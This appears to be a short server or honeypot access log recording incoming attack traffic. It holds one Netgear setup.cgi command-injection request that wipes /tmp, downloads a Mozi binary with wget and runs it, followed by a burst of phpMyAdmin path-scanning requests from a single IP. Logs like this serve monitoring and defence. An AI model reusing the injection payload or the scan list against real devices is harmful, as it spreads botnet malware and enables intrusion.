[22:43:34] This session was started on 2022. 05. 30. 22:43:34
[22:43:34] Listening to port 3001...
[22:43:34] Listening to port 80...
[22:58:37] 178.72.68.174 on login page. /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
[23:14:48] 82.136.99.109 on login page. /sql/phpMyAdmin2/index.php?lang=en
[23:14:48] 82.136.99.109 on login page. /administrator/phpmyadmin/index.php?lang=en
[23:14:48] 82.136.99.109 on login page. /sql/phpmyadmin5/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /mysqladmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /program/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /db/myadmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /db/phpMyAdmin3/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /_phpMyAdmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /mysql/dbadmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /phpMyAdmin-5.1.0/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /admin/phpMyAdmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /administrator/PMA/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /sql/websql/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /sql/phpmyadmin4/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /sql/php-myadmin/index.php?lang=en
[23:14:49] 82.136.99.109 on login page. /sql/phpmy-admin/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /pma/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /phpmyAdmin/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /mysql/pma/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /phpmyadmin2016/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /db/websql/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /phpMyAdmin-5/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /phpMyAdmin/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /sql/phpMyAdmin/index.php?lang=en
[23:14:50] 82.136.99.109 on login page. /db/phpMyAdmin-4/index.php?lang=en
